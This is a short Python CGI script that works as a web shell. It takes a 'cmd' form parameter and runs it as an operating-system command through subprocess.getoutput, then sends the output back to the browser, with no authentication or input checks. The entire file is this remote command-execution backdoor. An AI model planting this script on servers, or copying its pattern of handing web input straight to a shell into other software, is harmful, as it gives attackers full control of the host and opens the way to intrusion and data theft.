#!/usr/bin/python3
print("Content-Type: text/html")     
print()                                
import cgi
import subprocess
form = cgi.FieldStorage() #store form data in 'form' 
command = form.getvalue('cmd') 
print(subprocess.getoutput(command))
